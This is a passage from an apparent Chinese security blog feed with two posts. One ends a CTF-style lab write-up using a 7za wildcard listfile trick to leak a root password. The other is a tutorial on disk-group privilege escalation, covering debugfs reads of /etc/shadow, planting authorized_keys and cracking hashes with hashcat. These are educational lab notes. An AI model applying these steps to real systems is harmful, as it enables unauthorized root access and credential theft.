-p$password -tzip *.<span class="built_in">zip</span> &gt; /opt/backups/backup.log</span><br><span class="line"></span><br><span class="line">www-data@zipper:/opt/backups$ cat backup.log</span><br><span class="line">cat backup.log</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>-Zip (a) [<span class="number">64</span>] <span class="number">16.02</span> : Copyright (c) <span class="number">1999</span>-<span class="number">2016</span> Igor Pavlov : <span class="number">2016</span>-05-<span class="number">21</span></span><br><span class="line">p7zip Version <span class="number">16.02</span> (locale=en_US.UTF-<span class="number">8</span>,Utf16=on,HugeFiles=on,<span class="number">64</span> bits,<span class="number">1</span> CPU AMD EPYC <span class="number">7413</span> <span class="number">24</span>-Core Processor                 (A00F11),ASM,AES-NI)</span><br><span class="line"></span><br><span class="line">Open archive: /opt/backups/backup.<span class="built_in">zip</span></span><br><span class="line">--</span><br><span class="line">Path = /opt/backups/backup.<span class="built_in">zip</span></span><br><span class="line"><span class="type">Type</span> = <span class="built_in">zip</span></span><br><span class="line">Physical Size = <span class="number">15736</span></span><br><span class="line"></span><br><span class="line">Scanning the drive:</span><br><span class="line"><span class="number">27</span> files, <span class="number">12370</span> <span class="built_in">bytes</span> (<span class="number">13</span> KiB)</span><br><span class="line"></span><br><span class="line">Updating archive: /opt/backups/backup.<span class="built_in">zip</span></span><br><span class="line"></span><br><span class="line">Items to compress: <span class="number">27</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Files read <span class="keyword">from</span> disk: <span class="number">27</span></span><br><span class="line">Archive size: <span class="number">15736</span> <span class="built_in">bytes</span> (<span class="number">16</span> KiB)</span><br><span class="line"></span><br><span class="line">Scan WARNINGS <span class="keyword">for</span> files <span class="keyword">and</span> folders:</span><br><span class="line"></span><br><span class="line">WildCardsGoingWild : No more files</span><br><span class="line">----------------</span><br><span class="line">Scan WARNINGS: <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data@zipper:/opt/backups$ su root</span><br><span class="line">su root</span><br><span class="line">Password: WildCardsGoingWild</span><br><span class="line"></span><br><span class="line">root@zipper:/opt/backups<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>

<p>密码为什么会被输出到日志文件中？</p>
<blockquote>
<p><a href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html">https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html</a></p>
</blockquote>
<p>命令：<code>7za a /opt/backups/backup.zip -p$``password</code> <code>-tzip *.zip &gt; /opt/backups/backup.log</code></p>
<p>查看&#x2F;www&#x2F;html&#x2F;uploads目录的文件</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-96.png.png"></p>
<p>在使用7z 使用**通配符 *.zip**时，@enox.zip 会被认为是listfile, 其中包含需要被压缩的文件列表（<a href="https://sevenzip.osdn.jp/chm/cmdline/syntax.htm">filelist</a>)</p>
<p>在7z执行时，它会把enox.zip视为包含应压缩文件列表的文件，它会将&#x2F;root&#x2F;secret的内容读取出来，但是由于该文件不是文件列表，所以会抛出错误并把内容作为错误信息输出，这儿就是打印到日志里。</p>
<p>看题解中 @enox.zip 和 enox.zip 软链应该是需要手动新建的来利用的，但是已经有了，简化了题目。</p>
<h2 id="pspy"><a href="#pspy" class="headerlink" title="pspy"></a>pspy</h2><p>另一个方法是使用pspy执行的命令</p>
<p>执行命令是 <code>7za a /opt/backups/backup.zip -p$``password</code> <code>-tzip *.zip &gt; /opt/backups/backup.log</code> 命令中包含读到的密码，密码会被直接输出。</p>
<h1 id="php-wrapper"><a href="#php-wrapper" class="headerlink" title="php wrapper"></a>php wrapper</h1><p>参阅： <a href="/post/20250311021811.html" title="PHP Wrapper 利用">PHP Wrapper 利用</a></p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>要善用搜索，zip文件中的php文件利用搜索能找到结果，不能陷入思维困局。</p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Disk group 提权</title>
    <url>/post/20250216164016.html</url>
    <content><![CDATA[<blockquote>
<p>原文： <a href="https://vk9-sec.com/disk-group-privilege-escalation/">https://vk9-sec.com/disk-group-privilege-escalation/</a></p>
</blockquote>
<p>Disk group 允许用户完全访问&#x2F;dev&#x2F;中包含的任何块设备。由于&#x2F;dev&#x2F;sda一般是根系统文件，而磁盘组对该设备拥有完全的读写权限，可以用于写入或读取任意文件内容</p>
<h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><ol>
<li>id命令</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=<span class="number">1000</span>(dora) gid=<span class="number">1000</span>(dora) groups=<span class="number">1000</span>(dora)<span class="punctuation">,</span><span class="number">6</span>(disk)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>列出&#x2F;dev设备owner和group owner， 查找所属group是disk的分区</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ls -l /dev</span><br><span class="line">drwxr-xr-x <span class="number">7</span> root root         <span class="number">140</span> Aug  <span class="number">3</span>  <span class="number">2024</span> disk</span><br><span class="line">brw-rw---- <span class="number">1</span> root disk    <span class="number">253</span><span class="punctuation">,</span>   <span class="number">0</span> Aug  <span class="number">3</span>  <span class="number">2024</span> dm<span class="number">-0</span></span><br><span class="line">brw-rw---- <span class="number">1</span> root disk      <span class="number">8</span><span class="punctuation">,</span>   <span class="number">0</span> Aug  <span class="number">3</span>  <span class="number">2024</span> sda</span><br><span class="line">brw-rw---- <span class="number">1</span> root disk      <span class="number">8</span><span class="punctuation">,</span>   <span class="number">1</span> Aug  <span class="number">3</span>  <span class="number">2024</span> sda1</span><br><span class="line">brw-rw---- <span class="number">1</span> root disk      <span class="number">8</span><span class="punctuation">,</span>   <span class="number">2</span> Aug  <span class="number">3</span>  <span class="number">2024</span> sda2</span><br><span class="line">brw-rw---- <span class="number">1</span> root disk      <span class="number">8</span><span class="punctuation">,</span>   <span class="number">3</span> Aug  <span class="number">3</span>  <span class="number">2024</span> sda3</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$ find /dev -group disk</span><br><span class="line">/dev/btrfs-control</span><br><span class="line">/dev/dm<span class="number">-0</span></span><br><span class="line">/dev/sda3</span><br><span class="line">/dev/sda2</span><br><span class="line">/dev/sda1</span><br><span class="line">/dev/sda</span><br><span class="line">/dev/sg1</span><br><span class="line">/dev/loop7</span><br><span class="line">/dev/loop6</span><br><span class="line">/dev/loop5</span><br><span class="line">/dev/loop4</span><br><span class="line">/dev/loop3</span><br><span class="line">/dev/loop2</span><br><span class="line">/dev/loop1</span><br><span class="line">/dev/loop0</span><br><span class="line">/dev/loop-control</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>查看所有分区</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">udev                               <span class="number">947</span>M     <span class="number">0</span>  <span class="number">947</span>M   <span class="number">0</span>% /dev</span><br><span class="line">tmpfs                              <span class="number">199</span>M  <span class="number">1.2</span>M  <span class="number">198</span>M   <span class="number">1</span>% /run</span><br><span class="line">/dev/dm<span class="number">-0</span>                          <span class="number">9.8</span>G  <span class="number">5.1</span>G  <span class="number">4.2</span>G  <span class="number">55</span>% /</span><br><span class="line">tmpfs                              <span class="number">992</span>M     <span class="number">0</span>  <span class="number">992</span>M   <span class="number">0</span>% /dev/shm</span><br><span class="line">tmpfs                              <span class="number">5.0</span>M     <span class="number">0</span>  <span class="number">5.0</span>M   <span class="number">0</span>% /run/lock</span><br><span class="line">tmpfs                              <span class="number">992</span>M     <span class="number">0</span>  <span class="number">992</span>M   <span class="number">0</span>% /sys/fs/cgroup</span><br><span class="line">/dev/loop0                          <span class="number">62</span>M   <span class="number">62</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/core20/<span class="number">1611</span></span><br><span class="line">/dev/loop2                          <span class="number">50</span>M   <span class="number">50</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/snapd/<span class="number">18596</span></span><br><span class="line">/dev/loop1                          <span class="number">64</span>M   <span class="number">64</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/core20/<span class="number">1852</span></span><br><span class="line">/dev/loop3                          <span class="number">92</span>M   <span class="number">92</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/lxd/<span class="number">24061</span></span><br><span class="line">/dev/loop4                          <span class="number">68</span>M   <span class="number">68</span>M     <span class="number">0</span> <span class="number">100</span>% /snap/lxd/<span class="number">22753</span></span><br><span class="line">/dev/sda2                          <span class="number">1.7</span>G  <span class="number">209</span>M  <span class="number">1.4</span>G  <span class="number">13</span>% /boot</span><br><span class="line">tmpfs                              <span class="number">199</span>M     <span class="number">0</span>  <span class="number">199</span>M   <span class="number">0</span>% /run/user/<span class="number">1000</span></span><br></pre></td></tr></table></figure>

<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>确认用户所属disk group之后，可以使用debugfs来枚举整个磁盘数据以获取root级权限，因为我们还拥有对磁盘块文件完全的读写访问权限，可以写入任意文件，换言之，有了disk group，实际上我们就是root，只不过是以一种迂回的方式。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ debugfs /dev/dm<span class="number">-0</span></span><br><span class="line">debugfs <span class="number">1.45</span><span class="number">.5</span> (<span class="number">07</span>-Jan<span class="number">-2020</span>)</span><br><span class="line">debugfs<span class="punctuation">:</span>  ls</span><br><span class="line">debugfs<span class="punctuation">:</span>  cd /root</span><br><span class="line">debugfs<span class="punctuation">:</span>  cat proof.txt</span><br><span class="line"><span class="number">492</span>fe994bfe90fd82258b4d6d1118374</span><br><span class="line">debugfs<span class="punctuation">:</span>  cat .profile</span><br><span class="line"># ~/.profile<span class="punctuation">:</span> executed by Bourne-compatible login shells.</span><br><span class="line"></span><br><span class="line">if <span class="punctuation">[</span> <span class="string">&quot;$BASH&quot;</span> <span class="punctuation">]</span>; then</span><br><span class="line">  if <span class="punctuation">[</span> -f ~/.bashrc <span class="punctuation">]</span>; then</span><br><span class="line">    . ~/.bashrc</span><br><span class="line">  fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>写authorized_keys, 写&#x2F;etc&#x2F;passwd ……</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">debugfs<span class="punctuation">:</span>  cp id_rsa.pub /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>读root公私钥、读&#x2F;etc&#x2F;shadow, hashcat爆破root密码 …..</li>
</ol>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">debugfs<span class="punctuation">:</span>  cat /etc/shadow</span><br><span class="line">root<span class="punctuation">:</span>$<span class="number">6</span>$AIWcIr8PEVxEWgv1$<span class="number">3</span>mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/<span class="number">4.</span>D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.<span class="punctuation">:</span><span class="number">19453</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="number">99999</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">:</span><span class="punctuation">:</span><span class="punctuation">:</span></span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">hashcat -m <span class="number">1800</span> root.hash</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>How It Works-临渊羡鱼</category>
        <category>linux提权</category>
      </categories>
  </entry>
</search>
